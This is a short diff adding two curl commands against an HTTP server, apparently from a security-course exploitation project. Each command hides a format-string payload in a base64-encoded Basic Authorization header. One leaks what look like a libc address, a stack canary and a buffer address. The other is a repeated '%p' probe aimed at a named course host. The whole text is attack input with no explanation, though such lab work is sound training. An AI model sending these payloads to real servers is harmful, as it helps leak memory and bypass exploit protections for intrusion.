@@ -1,0 +1,2 @@
+curl http://127.0.0.1:8000 -H 'Authorization: Basic bGliYy4lMjMkcCBjYW5hcnkuJTI3JHAgYnVmZmVyLiUyOCRwOmhlbGxv' -v
+curl http://project-2.csec.chatzi.org:8000/ -H 'Authorization: Basic LiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVwLiVw' -v
